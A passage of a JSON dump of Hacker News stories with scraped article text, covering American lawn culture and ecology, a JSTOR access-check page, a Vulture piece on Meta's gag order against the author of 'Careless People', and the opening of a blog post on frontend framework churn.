fill Chesapeake Bay is hurled collectively onto American lawns, along with more than 80 million pounds of pesticides, in order to maintain the sanitized, carpet-like turf. In aggregate, this vast expanse of manicured grass rivals the area of America’s celebrated national parks.It’s a waste of space, Douglas Tallamy, an entomologist at the University of Delaware, told me. More biodiversity on American lawns could soak up carbon, better mitigate floods, support pollinators that propagate our food and host the insects that form the crucial early threads of the terrestrial food web. “But lawns do none of those things,” Tallamy said.\n\n      “How did the American lawn become the site of such vicious disagreements?”\n\n        Facebook\n        Twitter\n        Email\n\nThe typical suburban lawn is zealously mown, raked and bombarded with chemicals. Flowering plants that would typically appear in an untended meadow are sparse. For insects, reptiles, birds and many other creatures, these places are hostile no-go zones. Closely cut grass is neither habitat nor food for most insects.\n\n            Read Noema in print.\n\n        Allowing dandelions and clover to sprout in lawns could help support a diversity of U.S. bees, studies have found. In North America, nearly a quarter of all native bees are threatened, according to the Center for Biological Diversity, and native bees are doing much critical pollination.Lawns that are friendly to insects are critical for a whole cascade of creatures up the food chain. North America’s bird population has shrunk by 3 billion — about one in four of all birds on the continent — since the 1970s. “That’s a genocide, a birdicide,” said Robbins. “And that comes from a cascade of all kinds of landscaping decisions.”Part of the problem is the myriad of foreign plants that now festoon suburban flowerbeds. Native insects evolved with native plants and cannot feed upon the waves of Bradford pear, burning bush, English ivy, ginkgo and porcelain berry that have found their way to the U.S. Worse, many of these imports become invasive after escaping yards and crowd out other plant life in public spaces. “They are what I call ecological tumors,” said Tallamy. “They get everywhere and are devastating our natural areas.”Of all the things that Mike and Sian Pugh loved most about the ranch-style home they bought in Loudon County, Virginia, in 2005, the meadow at the rear of the property was foremost. Mike, who is a record producer, enjoyed periodically strolling out of the French doors into the pasture where cows once grazed. It had never been a lawn. The Pughs seeded the field with wildflowers and from their porch keenly watched the birds, deer and butterflies, especially the monarchs fluttering to the milkweed.“I planted a few things,” Mike told me, “but mostly left it alone. It was a conscious decision — it was one of the reasons we got the house.” He would occasionally battle invasive grasses and mow the field, but he enjoyed the vibrancy of the meadow’s natural state. “When you get to fall and there are 14 different colors of yellow there, it’s stunning,” he said.But someone complained about the chickens the Pughs were raising, contravening HOA edicts, and the dispute ramped up to include the meadow itself. Some neighbors, Mike told me, felt that the Pughs were not playing by the rules everyone else was: diligently trimming hedges, mowing lawns and painting fences black. It was a matter of fairness, they said.At heated local meetings, the Pughs were accused of reducing nearby property values. “People would scream at us,” Mike said. “I was called a bully and a ‘fucking liar.’ The first time that happened, it was really upsetting. It became ridiculous. I think these people are huge hypocrites.” As Marcus Lopez, then the president of the HOA, told The Washington Post in 2018, the Pughs “upset a lot of people. There’s a principle involved. If you have one exception, how do you hold a neighborhood to a standard?”The battle ended up costing the Pughs $40,000 in legal fees over five years. Ultimately, the two sides settled with an agreement in 2019 that the HOA rules would have to change in order to force the Pughs to cut the meadow. The Pughs moved last year to a smaller property in West Virginia, where they feel people are less likely to intervene over vegetation choices.Resistance to the imposition of lawns has gathered steam in recent years. They are increasingly viewed as a crucible of environmental breakdown. A growing number of homeowners, alarmed by a loss of nature that imperils birds and bees, have started to question whether their lawns need to be closely cut and strafed with chemicals. The National Wildlife Federation has reported a surge in the number of homes they’ve certified as wildlife gardens.Some laws are shifting in response. After the Crouches came to a settlement with their neighbor and HOA in 2020 — agreeing to restore a strip along the property boundary but leaving the rest of the garden intact — the state passed groundbreaking legislation to curb the ability of HOAs to raze eco-friendly yards.But as is often the case in the U.S., a change to an old status quo triggered a backlash. Defenders of the idealized postage stamp of emerald lawn aren’t backing down, seeking to overturn reforms aimed at allowing in wilder, more nature-orientated gardens.Five years ago, Appleton, Wisconsin, embraced No Mow May, an initiative that grew popular in the U.K. that encourages people to ease off on cutting the lawn during May to allow flowering plants that provide nutrition to bees and other animals. But then last summer, Appleton reversed course, reinstating previous requirements for residents to keep grass to eight inches or less during May and instead offering more general pollinator-friendly guidance for a “slow mow summer.”\n\n      “The typical suburban lawn is zealously mown, raked and bombarded with chemicals. Flowering plants that would typically appear in an untended meadow are sparse.”\n\n        Facebook\n        Twitter\n        Email\n\n“There was a lot of feedback that it was sort of ridiculous, that we look like a shabby city,” said Sheri Hartzheim, an Appleton councilor who voted for No Mow May to be scaled back. “People were using it as an excuse to not maintain yards. Without rules, there is chaos.”Hartzheim identifies as a libertarian but told me she considered neat lawns a sort of civic virtue, which she acknowledged could be inconsistent with her usual suspicion of onerous regulations. “I generally think government should stay out of people’s business,” she said. “But we live in a city, and there are rules for a reason; we have to live next door to folks. Letting yards go willy-nilly, having mice and voles everywhere — that isn’t something we should support.”Grass is not the only thing about lawns that divides Americans. Filipine Hoogland, who advocates for reformed landscaping practices in New York, has been pushing for restrictions on leaf blowers due to their noise and environmental impact. “We get so many aggressive reactions,” she told me. “We’ve gotten death threats. They feel it’s overreaching.”Hoogland was born in the Netherlands and has spent decades in the U.S. She lamented the American attitude to lawns — “an enigma” to her. “Americans are more afraid of pests, and there is this infatuation with cleanliness — I don’t really understand it,” she said. On landscaping crews, with their armories of mowers and weed whackers and pesticide appliers, she said: “These aren’t gardeners — they are cleaning services. They have no clue about plants.”\n\n      “Defenders of the idealized postage stamp of emerald lawn aren’t backing down.”\n\n        Facebook\n        Twitter\n        Email\n\nTallamy advocates for what he calls “homegrown national parks” — seeding native plants (oaks are an excellent choice for most places, he said) and reducing mowing and chemicals. Lawns can exist in this world, too, just not as the sole representative of green spaces. “It doesn’t mean we have to become slobs,” he said. “We can still have manicured lawns to line flowerbeds or driveways to show it’s intentional. We just have to have less of it. We need more plants and less lawn.”On talks around the country, Tallamy said he gets a largely positive response to this message. “The culture is changing,” he said. “Just not fast enough. You still see a lot of lawn out there.” Cultural change is messy and can prompt a backlash. It may take the hard-edged limits of a changing environment and unyielding economics for lawns to recede from the norm of American life.Geography may help. In the U.S. West, severe drought fueled by the climate crisis has spurred cities such as Las Vegas to tear out ornamental grass and reorientate more pragmatically to more parched surroundings. Homeowners in exclusive California neighborhoods have been shamed for dousing their lawns in water. “Water’s expensive; it’s harder to come by, and west of the Mississippi, it starts to seem like a really bad idea to use a whole lot of water on lawns,” said Robbins. Elsewhere, inflation and a potential labor shortage may make it less attractive for homeowners and municipalities to pour endless funding into machinery and toxins that obliterate every weed and wildflower.But at our current political moment, the shift toward more natural landscapes and concern about pollinators may not happen quickly. “The future of the lawn depends on things that have very little to do with individual choice,” Robbins said, citing water availability, real estate markets and the cost of fertilizer and other chemicals. Fevered politics, too, will leave its mark. “I worry that a slow movement towards an agreement that may be a more diverse landscape is possible might bump up against our current political moment,” he said. “And that might be yet another way that lawns hang on for another 40 years.”\n\n            Enjoy the read? Subscribe to get the best of Noema.\n\n\tMore From Noema Magazine\n\n              Essay\n\n          Philosophy & Culture\n\n        Announcing The Berggruen Press\n\n            Nathan Gardels & Peter Mellgard\n\n              Feature\n\n          Climate Crisis\n\n        How To Build A Thousand-Year-Old Tree\n\n            Matthew Ponsford\n\n              Feature\n\n          Climate Crisis\n\n        A Climate Solution On The Half Shell\n\n            Aryn Baker",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "120a17d363f0ec34",
    "title": {
      "en": "The Burnout Machine",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://unionize.fyi",
    "score": 777,
    "by": "flxfxp",
    "time": 1742495057,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "b23eeabac05f440a",
    "title": {
      "en": "Cyberlibertarianism: The Right-Wing Politics of Digital Technology",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.jstor.org/stable/10.5749/jj.14308236",
    "score": 18,
    "by": "doener",
    "time": 1742626967,
    "content": "Access Check\n            Our systems have detected unusual traffic activity from your network. Please complete this reCAPTCHA to demonstrate that it's\n               you making the requests and not a robot. If you are having trouble seeing or completing this challenge,\n               this page may help.\n               If you continue to experience issues, you can contact JSTOR support.\n\n            Block Reference: #9677c848-07ba-11f0-852f-8a8e7337b31a\n               VID: #\n               IP: 175.196.243.166\n               Date and time: Sun, 23 Mar 2025 07:44:01 GMT\n               Javascript is disabled\n            Go back to JSTOR",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "5f1f764c1a0fca70",
    "title": {
      "en": "Researcher uses AI to make texts that are thousands of years old readable (2023)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://phys.org/news/2023-02-ai-texts-thousands-years-readable.html",
    "score": 37,
    "by": "mooreds",
    "time": 1742345947,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6c8efc4f5fa340b0",
    "title": {
      "en": "In some parts of the US, the clack of typewriter keys can still be heard",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.bbc.com/future/article/20250321-the-people-who-still-use-typewriters",
    "score": 6,
    "by": "Geekette",
    "time": 1742682308,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "18b509e2a99eb61d",
    "title": {
      "en": "How a Gag Order Made 'Careless People' a Bestseller",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.vulture.com/article/careless-people-sarah-wynn-williams-facebook-gag-order.html",
    "score": 30,
    "by": "herbertl",
    "time": 1742653075,
    "content": ".layout > .ad-splash,\n      .one-column-layout > .ad-splash {\n        display: none;\n      }\n\n                backstories\n\n                Mar. 22, 2025\n\n          The Gag Order That Birthed a Best-seller\n            Behind the making of Careless People, the Facebook tell-all its publisher insists is “not a book of news.”\n\n            By\n        Madeline Leung Coleman,\n          features writer for New York.\n\n            Careless People author Sarah Wynn-Williams stands behind former Indonesian President Joko Widodo and Mark Zuckerberg in 2014.\n          Photo: Oscar Siagian/Getty Images\n\n                  Careless People author Sarah Wynn-Williams stands behind former Indonesian President Joko Widodo and Mark Zuckerberg in 2014.\n                Photo: Oscar Siagian/Getty Images\n\n        Sarah Wynn-Williams can’t do interviews. She can’t post on social media or go on tour or give a talk. Her family can’t speak on her behalf, and her friends are afraid to. None of this has affected the sales of her first book, a memoir of the six years she spent working for Facebook. Instead, it may have helped them: The moment that an arbitrator (requested by Meta) slapped Wynn-Williams with a gag order, banning her from promoting her memoir, Careless People, he handed her the kind of publicity no book party could match. Suddenly, Careless People wasn’t just another tech whistleblower book;it was the book Mark Zuckerberg didn’t want you to read, and for many, that’s enough to recommend it. In the week following its release on March 11, Careless People hit the top of the Times best-seller list and sold 60,000 copies. It’s selling out in New York bookstores and prominently displayed in the ones that still have it. The book has taken on an air of persecution, even scarcity — as much as something freely available on Amazon (it’s now No. 3 on the Amazon best-seller list) can be called those things. When I brought a copy up to the counter at a Brooklyn Barnes & Noble, the salesperson waggled his eyebrows. “Ooo, yeah, everyone’s reading this one,” he said. “I think they’re trying to get it taken off shelves, so it’s like, Get it while you can.”\n\n  The book is not being taken off shelves, and Meta has stopped short of saying it thinks it should be. The reason an arbitrator says Wynn-Williams, a former global policy director at the company, can’t promote it is because she violated the non-disparagement agreement she signed as part of her severance when Facebook fired her in 2017. Her publisher, Flatiron, knew the subject matter was risky. The imprint announced the existence of Careless People just six days before the pub date, giving Wynn-Williams enough time to squeak in a few interviews teasing the book’s topics — including Facebook’s investment in censorship tools that it hoped would give it entrée to China — and sending Meta’s comms team, which issued statements denying the contents of a book no one had even read yet, into a tailspin. One document Meta put out to try to throw the public off the scent, titled “CARELESS REPRINT,” was simply a list of all the subjects it thought would be in the book, annotated by previously published damning stories about said subjects. I asked Meta’s communications director, Andy Stone, why it would do this; doesn’t that just draw attention to the stuff she’s writing about, maybe even bolster it? Stone said he didn’t think so. The goal was just “just to point out that much of this had been reported previously.”\n\n  The book turned out to contain much more. Wynn-Williams recounts long, detailed in-person conversations with Zuckerberg, Sheryl Sandberg, and her former manager Joel Kaplan, who is now Meta’s top policy official and chief liaison with the Trump administration. She reprints what appear to be excerpts from company emails and DMs. Since her work was focused on Facebook’s global policy, she spends much of the book zigzagging across the globe from Indonesia to Colombia, recounting private meetings, karaoke sessions, and games of Settlers of Catan — which she claims everyone let Zuck win — from the perspective of the most nervous person on the private jet. Wynn-Williams recalls the meetings that she says she persuaded Zuckerberg to attend with foreign dignitaries, determined to sway legislation that could make or break Facebook’s fortunes in other countries. “It’s made very clear to me that Mark has no interest in policy or politics … his disregard for politics is a point of pride,” she writes. Her book is an account of him learning to care — in part, she implies, because of her influence.\n\n  Wynn-Williams describes being stunned by the ignorance of executives, as when Sandberg insists that Facebook could and should become a global broker for organ donation. (That idea gets scrapped.) But despite the cavalier attitude she says she witnessed toward other countries’ legal systems and Meta’s general disregard for employees’ personal lives, Wynn-Williams portrays herself as a true believer. She admits to being dazzled by Sandberg’s star power and touched when she sees Zuckerberg’s softer side. Her relationship with Kaplan is contentious; she alleges that Kaplan demanded she work through her maternity leave, barraged her with sexually charged comments on a regular basis, and grinded against her during a company party. (Meta’s communications team says that Wynn-Williams’s allegations were found to be “misleading and unfounded.”) But she doesn’t really turn on Zuckerberg until a Facebook employee in Brazil is arrested — and, she writes, the founder doesn’t seem to care. As she described it to NPR, her loss of faith in the company “wasn’t a lightning bolt. It was sort of a steady drip, drip, drip.”\n\n  A few days after Careless People debuted, I called Megan Lynch, Flatiron’s publisher and executive VP. The book had by then entered Amazon’s top five and the mood at the imprint, which is owned by Macmillan, seemed to tilt unstably from excitement (everyone’s talking about our book), to concern (author’s in trouble for our book), to avoidance (we don’t want to be in trouble for our book). Lynch, who acquired and edited Careless People, stated and restated her support for Wynn-Williams, whom she calls “a hero.” I asked her how Wynn-Williams was doing. “Nervous, but soldiering on,” Lynch says. “She sees the bigger picture in all of this, and it was very important to her to share her truth. Gratitude about having done that outweighs the extreme difficulty of the personal situation that she is in.” However, she added, “it’s frustrating to her that the story of Meta trying to silence her is distracting people from the things that are on the page, and the things that are on the page are very, very serious things that she hopes everybody pays attention to.” But how are sales? Lynch’s voice brightened: “Obviously, it’s been fun to see the Amazon pop!”\n\n  Lynch and her team first met Wynn-Williams last May in the midtown offices of the author’s agent, Christy Fletcher of UTA. Lynch had never heard of Wynn-Williams, who is 45 and lives in London. The author and agent handed off a nearly complete manuscript that persuaded Lynch to put in a bid. “I mean, there have been Facebook-whistleblower books before, you know. That wasn’t what drew me to this book,” Lynch told me. “I wanted to publish it because I thought it was an amazing memoir that told the story of being an ambitious woman of my generation, and I connected with it in a strongly personal way.” This is maybe especially because the book is full of stories about confrontations with, among others, Sheryl Sandberg, who was then the company’s COO. “Women my age, we were all very earnest acolytes of Lean In when it was published,” Lynch said, adding that there’s been “profound disillusionment since then.” In Wynn-Williams’s description, Sandberg is a charismatic tyrant who demands too much work and too much intimacy from her underlings; at one point, Wynn-Williams writes that Sandberg and a 26-year-old protégé — who acknowledges to Wynn-Williams that she’s been chosen as “Sheryl’s little doll” — take turns lying in each other’s laps in the back of a car, stroking each other’s hair. During a long private-jet ride back from Davos,Sandberg tries to summon Wynn-Williams to share the jet’s one bed with her. “Sarah, come to bed,” she orders her loudly while their co-workers turn their gazes to the floor. (The author, at this point massively pregnant and distraught to be traveling at all, refuses.)\n\n        {\n          \"@id\": \"#articleSchema\",\n          \"image\": {\n            \"@context\": \"http://schema.org\",\n            \"@type\": \"ImageObject\",\n            \"creditText\": \"Mark Peterson/Redux\",\n            \"caption\": \"Sheryl Sandberg at the company’s headquarters in 2017.\",\n            \"contentUrl\": \"https://pyxis.nymag.com/v1/imgs/9fb/127/f371bbda1983a0f1d61f153aaae565b15e-careless-people-secondary-2.2x.rhorizontal.w700.jpg\",\n            \"width\": \"1400\",\n            \"height\": \"934\"\n          }\n        }\n\n      Sheryl Sandberg at the company’s headquarters in 2017.\n      Photo: Mark Peterson/Redux\n\n  Flatiron paid Wynn-Williams a “healthy” advance, Lynch said, confirming only that it was north of $500,000. Then began the problem of how to keep the book a secret. This was exacerbated by the fact that Wynn-Williams had just filed a whistleblower complaint with the SEC in April 2024, alleging that Meta misled investors about the extent of its operations in China and had planned to hire a “chief editor” who could remove content at the behest of the CCP. Lynch says Flatiron kept the editorial and production processes on a need-to-know basis, using techniques it had developed while handling past Macmillan tell-alls such as James Comey’s book, Michael Wolff’s Fire and Fury, and Edward Snowden’s memoir. Since Lynch didn’t work on those, she drew on her experience editing something even leakier: a quick-turnaround 2023 oral history of BTS, translated from Korean, called Beyond the Story. That one taught her what can happen when a publisher puts something in its catalogue called a “shell listing,” whereby a spot is held for a forthcoming book that isn’t described beyond “untitled music memoir” or the like. “There was an incident with the BTS book where Taylor Swift fans found the listing for ‘untitled Flatiron book’ for a specific date that they thought was meaningful in Taylor Swift numerology and thought it was a Taylor Swift book and started ordering it. Then, obviously, we had to announce that it was not Taylor Swift,” she said. “Fortunately, there was a lot of overlap between Swifties and ARMY, so nobody got too upset.” Lesson learned: No shell listing for Careless People.\n\n  Lynch had to move fast. “Drawing on my experience with BTS, I felt like the No. 1 thing we could do to keep the project under wraps was not to have to keep it under wraps for very long,” she said. Although she wanted Careless People to come out before the election, Flatiron needed the whole fall for editing, legal review, and production, so they landed on March. The book’s accounts of in-person conversations rely heavily on Wynn-Williams’s memory of long-ago interactions with people who were not informed of the book before publication. While some of Wynn-Williams’s former colleagues have posted in support of the book, others have disputed her account. One person who figures prominently in the book posted simply, “No one called me.” Meta, which Zuckerberg recently announced would stop employing fact-checkers, has made a huge deal out of that last bit: It alleges that the book wasn’t fact-checked. If this is true, it’s not an aberration. It’s an open secret that many publishers do not independently fact-check nonfiction books and largely rely on the writers to do so; often, a writer who wants another set of eyes on their work will need to hire a fact-checker themselves. Macmillan’s official line on Careless People is that although her account of her experiences is supported by “a trove of documentation,” they were not obligated to reach out to people in the book for comment. They also emphasize that this is standard for first-person memoirs. Or as Lynch puts it, “She’s not a journalist. She’s not a historian. It’s her personal recollections. It’s not a book of news.”\n\n  Nonetheless, Lynch was adamant that the manuscript she received from Wynn-Williams was fully annotated and that the author had “saved all kinds of contemporaneous communications that are underpinning absolutely everything in the book — emails, memos, DMs, all kinds of things,” ranging across the entire period she was working there, from 2011 to 2017. While she did not personally look at all of the evidence herself, Lynch said, “I knew that if I had questions about something, what there was supporting evidence for and what there wasn’t.” And of course, Macmillan’s legal team “vetted” all of it. I asked Lynch what she thought fact-checking standards should be for a memoir, as opposed to for more straightforward reportage. “This may be a question I punt to legal,” she said. Was there a fact-checking process outside of the lawyers’ vetting that the author had reason to say what she said — someone actually going through those footnotes one by one and comparing them against the text? Again, she said, “that’s a question for the lawyers.” (The lawyers, in the end, couldn’t speak to me.) When Wynn-Williams was still able to do interviews, a reporter for Business Insider also asked her whether the book was fact-checked. “I think Meta’s problem is using this to not answer the questions themselves. What I would love is for us not to fall into the distraction,” Wynn-Williams said, dodging the question in turn.\n\n  Although the gag order suggests otherwise, Careless People is a careful book: Wynn-Williams, who was in her early 30s when she began working for Facebook, presents herself as a wide-eyed idealist, a small-town Everywoman who believes in the company’s ability to do good long past the point when its harms have been publicized. The self she depicts in Careless People is one drawn helplessly to what she sees as Facebook’s essential ideals of connectivity and openness. Facebook is the “revolution” that she wants to be a part of: “We need to get this right, for the hundreds of millions who are sure to be using these platforms every day, for years to come.” She acted as a Facebook ambassador, a friendly, networky presence who was unable to make big decisions but responsible for selling them on the global stage. The book reiterates again and again that she did not stray to the dark side. She writes that she watched in horror as anti-Muslim hate speech took over Facebook feeds in Myanmar, unchecked by content moderators. (She claims that for a time Facebook’s operations team had only one Burmese speaking employee to deal with this.) She says she sounded the alarm bells when the company decided Facebook should be used as a tool to win elections worldwide but that everyone ignored her. And although she was among those who worked to get Zuckerberg an audience with Xi Jinping, she reserves special disgust for Facebook’s dealings with Chinese officials.\n\n  Lynch said that because Wynn-Williams’s tenure at Facebook ended eight years ago, “the book had to answer the question of ‘why now?’ even though I didn’t think that was a fair question. There are things that she ended up adding about the urgency of understanding some of what happened between Facebook and China because of the coming AI weapons race.” The “why now?” is mitigated by the fact that Meta continues to feature so prominently in the news — especially since Zuckerberg’s public cozying up to the Trump administration — but there is friction in the book between what Wynn-Williams appears to be feeling in the moment and her retrospective analysis of it. It’s easy to detect a kind of doublethink in sections where she expresses disgust at the company’s actions while doubling down on her belief in its essence. She often seems to be insisting that what Facebook is doing is not really what Facebook is about. After detailing Zuckerberg’s obsession with getting Facebook into China and how appalled she was when she realized it was actively building censorship tools to accomplish this, she writes, “The mission of the company — making the world more open and connected — is the exact opposite of what the Chinese Communist Party wants, particularly under President Xi Jinping.” This doesn’t quite land, as it’s clear by this point in the book that the CCP and Facebook are not opposites. They share a major interest: collecting civilian data.\n\n        {\n          \"@id\": \"#articleSchema\",\n          \"image\": {\n            \"@context\": \"http://schema.org\",\n            \"@type\": \"ImageObject\",\n            \"creditText\": \"Ted S. Warren/Reuters\",\n            \"caption\": \"Chinese President Xi Jinping (center) and Zuckerberg in 2015. Wynn-Williams writes that Chinese officials were offended when Zuckerberg posted this photo because it only shows the back of Xi’s head.\",\n            \"contentUrl\": \"https://pyxis.nymag.com/v1/imgs/cc6/738/3a5e176ea10381aa18e9f6ded096936a9f-careless-people-secondary-1.2x.rhorizontal.w700.jpg\",\n            \"width\": \"1400\",\n            \"height\": \"934\"\n          }\n        }\n\n      Chinese President Xi Jinping (center) and Zuckerberg in 2015. Wynn-Williams writes that Chinese officials were offended when Zuckerberg posted this photo because it only shows the back of Xi’s head.\n      Photo: Ted S. Warren/Reuters\n\n  Wynn-Williams was not forthcoming even during the interviews she was able to do before the gag order. She is, after all, a former lawyer, diplomat, and tech exec; she knows how to stay on message. She has been vague about her activities since leaving Facebook in 2017. When Business Insider asked her how long it took to write the book, she said, “The process was off and on …There were moments when something would happen, there would be a headline about China, and I’d think, ‘It would be so different if people knew the truth.’” Lynch told me that she didn’t know when Wynn-Williams started writing the book and that I would have to ask Fletcher, the author’s agent. The book is a page-turner, and Wynn-Williams has never written one before, so I had to wonder: Did the author work with a ghostwriter? When I asked Lynch this, there was a pause on the line. “Um,” said Lynch. “I am gonna have to leave that question to Christy because I wasn’t involved with anyone but Sarah editorially. Just … yeah, I just have to let her answer the question.” (A Macmillan publicist later told me that Wynn-Williams did not work with a ghostwriter; Fletcher did not respond to request for comment.)\n\n  Wynn-Williams has shared little about her post-Facebook career. One story described her only as a “tech policy consultant,” and both in the book and in other interviews she has mentioned “working on” the dialogue between the U.S. and China on the use of AI in weapons. She hasn’t said for whom or in what capacity she did that, but public reports show that by 2021, she was living in London and working for the Minderoo Foundation, an Australian philanthropic venture founded by a mining-billionaire couple who pour money into environmental impact and tech-related research. Wynn-Williams held the title there of “CEO of Frontier Technology” and had the capacity to direct funding toward projects related to her interests — or so it seemed to Ariella Steinhorn, another refugee from the tech-policy world who has spent the past several years trying to get funding for an advocacy project related to whistleblowers, including many from the tech world, who are muzzled by NDAs. They met on Zoom in early 2023, and Steinhorn says Wynn-Williams seemed excited by her work; Wynn-Williams said she wanted to get Steinhorn’s whistleblower-focused project some funding through the foundation. “I don’t recall her talking about the experiences. It just seemed like she was on the same page,” Steinhorn says. “There were times where I would say something and she would nod and affirm it very intensely.” Shortly after they’d connected, though, Wynn-Williams stopped responding to emails; to Steinhorn, it was as if she had “disappeared.”\n\n  Around the same time, documents made public by the SEC show that Wynn-Williams submitted a proposal to Meta that she hoped would push the company to disclose more about the inner workings of its past and present relationship with China at an annual shareholder meeting. But after hitting a series of roadblocks, she withdrew her proposal and the matter was dropped. Wynn-Williams alludes briefly to this time in the epilogue to her book, writing that she and another former Facebook employee turned tech whistleblower, Ifeoma Ozoma, started working with activist-shareholder groups to try to force companies such as Apple and Amazon to be more transparent and to stop forcing employees to sign NDAs that would prevent them from reporting abuse. They don’t appear to have been successful either.\n\n  In light of all this, Careless People starts to look more like a drastic escalation than an opening salvo: memoir as nuclear option. Vincent White, an employment lawyer in New York, says that based on the Meta employment contracts he’s seen, it’s likely she actually signed two NDAs — one when she was hired and another when she was fired. (Meta says Wynn-Williams was fired for “poor performance” and “toxic behavior”; she writes in the book that it happened after she reported Kaplan for sexual harassment and the company cleared him.) A lot of the time, companies won’t enforce NDAs against whistleblowers because it makes them look like villains. And the optics of Meta’s gag order on Wynn-Williams are terrible, White says. But “I’m guessing it’s not about her, right? Whatever she wrote, it’s already out there. You can’t put it back in,” he says. “This is to let the next person know: We are actually going to enforce those agreements. No matter how bad we look, we’ll still get you for what you said.” He guesses this is doubly on the company’s hive mind since Meta just laid off 3,600 people, or 5 percent of its workforce, in February, citing poor performance —a couple dozen of whom White is now representing.\n\n  “She’s doing a noble, brave thing, but I worry that she’s destroying herself,” says White. “First off, she may never work again. Financially, the damages from this could be astronomical. And in terms of her reputation, she’s going to always be the one who outed Meta, no matter what else she achieves. All of that will be a footnote to this.” That might not be a bad thing. After the arbitrator ordered Wynn-Williams to stop promoting her book, Stone, the Meta spokesperson, took to Threads with a link to the decision, writing, “This ruling affirms that Sarah Wynn Williams’ false and defamatory book should never have been published.” Commenters rushed in to block his victory lap: “i am now 500× more interested in this book!” “great sales pitch - thx big dog.” “Thanks for the heads up. Hadn’t heard about this one, but now excited to read it.” One poster, who said he was buying copies for his friends and family, summed it up: “Aren’t you fascist fools familiar with the Streisand Effect?”\n\n    Tags:\n\n            vulture homepage lede\n\n            careless people\n\n            facebook memoir\n\n            facebook\n\n            books\n\n            sarah wynn-williams\n\n            backstories\n\n          More\n\n        Show\n      13 Comments / 13 New\n\n    Leave a Comment\n\n      The Gag Order That Birthed a Bestseller\n\n    const freeLayoutsInstances = [\n      'ecom-article',\n      'ecom-products',\n      'non-monetizable'\n    ];\n    const paywalledLayoutsInstances = ['paywalled-article'];\n    const layoutInstance = document.querySelector('html').getAttribute('data-layout-uri').split('/instances/')[1].replace('@published', '');\n    const siteSlug = 'vulture';\n    const keywords = [\"careless people\",\"facebook memoir\",\"facebook\",\"books\",\"sarah wynn-williams\",\"vulture homepage lede\",\"backstories\"]; // This is set by handlebars in the server.\n    const featureTypes = window._nymPermutive?.article?.featureTypes;\n    const freeConditions = {\n      isStrategist: !paywalledLayoutsInstances.includes(layoutInstance) && siteSlug === 'strategist',\n      isFreeLayout: freeLayoutsInstances.includes(layoutInstance),\n      hasExcludePaywallTags: /paywall exclude/i.test(keywords.join(',')),\n      isEcomm: featureTypes && featureTypes.includes('ecomm')\n    };\n    const structuredData = {\n      '@context': 'http://schema.org',\n      '@id': '#articleSchema',\n      hasPart: {\n        '@type': 'WebPageElement',\n        cssSelector: '.article-content',\n        isAccessibleForFree: false\n      },\n      isAccessibleForFree: false\n    };\n    for (const condition of Object.keys(freeConditions)) {\n      if (!freeConditions[condition]) continue;\n      structuredData.isAccessibleForFree = true;\n      structuredData.hasPart.isAccessibleForFree = true\n      break;\n    }\n    const ldJsonScript = document.createElement('script');\n    ldJsonScript.type = \"application/ld+json\";\n    ldJsonScript.innerHTML = JSON.stringify(structuredData);\n    document.head.appendChild(ldJsonScript);",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d538177b8059be72",
    "title": {
      "en": "The Frontend Treadmill",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://polotek.net/posts/the-frontend-treadmill/",
    "score": 726,
    "by": "Kerrick",
    "time": 1742473531,
    "content": "The Frontend TreadmillA lot of frontend teams are very convinced that rewriting their frontend will lead to the promised land. And I am the bearer of bad tidings.If you are building a product that you hope has longevity, your frontend framework is the least interesting technical decision for you to make. And all of the time you spend arguing about it is wasted energy.I will die on this hill.If your product is still around in 5 years, you’re doing great and you should feel successful. But guess what? Whatever framework you choose will be obsolete in 5 years. That’s just how the frontend community has been operating, and I don’t expect it to change soon. Even the popular frameworks that are still around are completely different. Because change is the name of the game. So they’re gonna rewrite their shit too and just give it a new version number.Product teams that are smart are getting off the treadmill. Whatever framework you currently have, start investing in getting to know it deeply. Learn the tools until they are not an impediment to your progress. That’s the only option. Replacing it with a shiny new tool is a trap.I also wanna give a piece of candid advice to engineers who are searching for jobs. If you feel strongly about what framework you want to use, please make that a criteria for your job search. Please stop walking into teams and derailing everything by trying to convince them to switch from framework X to your framework of choice. It’s really annoying and tremendously costly.I always have to start with the cynical take. It’s just how I am. But I do want to talk about what I think should be happening instead.Companies that want to reduce the cost of their frontend tech becoming obsoleted so often should be looking to get back to fundamentals. Your teams should be working closer to the web platform with a lot less complex abstractions. We need to relearn what the web is capable of and go back to that.Let’s be clear, I’m not suggesting this is strictly better and the answer to all of your problems. I’m suggesting this as an intentional business tradeoff that I think provides more value and is less costly in the long run. I believe if you stick closer to core web technologies, you’ll be better able to hire capable engineers in the future without them convincing you they can’t do work without rewriting millions of lines of code.And if you’re an engineer, you will be able to retain much higher market value over time if you dig into and understand core web technologies. I was here before react, and I’ll be here after it dies. You may trade some job marketability today. But it does a lot more for career longevity than trying to learn every new thing that gets popular. And you see how quickly they discarded us when the market turned anyway. Knowing certain tech won’t save you from those realities.I couldn’t speak this candidly about this stuff when I held a management role. People can’t help but question my motivations and whatever agenda I may be pushing. Either that or I get into a lot of trouble with my internal team because they think I’m talking about them. But this is just what I’ve seen play out after doing this for 20+ years. And I feel like we need to be able to speak plainly.This has been brewing in my head for a long time. The frontend ecosystem is kind of broken right now. And it’s frustrating to me for a few different reasons. New developers are having an extremely hard time learning enough skills to be gainfully employed. They are drowning in this complex garbage and feeling really disheartened. As a result, companies are finding it more difficult to do basic hiring. The bar is so high just to get a regular dev job. And everybody loses.What’s even worse is that I believe a lot of this energy is wasted. People that are learning the current tech ecosystem are absolutely not learning web fundamentals. They are too abstracted away. And when the stack changes again, these folks are going to be at a serious disadvantage when they have to adapt away from what they learned. It’s a deep disservice to people’s professional careers, and it’s going to cause a lot of heartache later.On a more personal note, this is frustrating to me because I think it’s a big part of why we’re seeing the web stagnate so much. I still run into lots of devs who are 